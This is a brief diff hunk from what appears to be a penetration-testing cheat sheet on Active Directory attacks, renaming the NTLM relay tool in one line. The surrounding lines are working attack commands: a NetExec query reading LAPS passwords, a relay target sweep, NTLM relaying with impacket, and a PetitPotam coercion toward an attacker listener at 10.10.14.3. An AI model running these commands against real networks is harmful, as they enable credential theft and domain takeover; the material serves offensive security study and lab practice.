@@ -293,7 +293,7 @@ nxc ldap dc01.corp.local -u laps-reader -p '...' --query '(msLAPS-Password=*)' '
 
 ```bash
 nxc smb 10.10.10.0/24 --gen-relay-list relay-targets.txt
-ntlmrelayx.py -tf relay-targets.txt -smb2support
+impacket-ntlmrelayx -tf relay-targets.txt -smb2support
 nxc smb 10.10.10.10 -u '' -p '' -M coerce_plus -o LISTENER=10.10.14.3 METHOD=PetitPotam
 ```
 
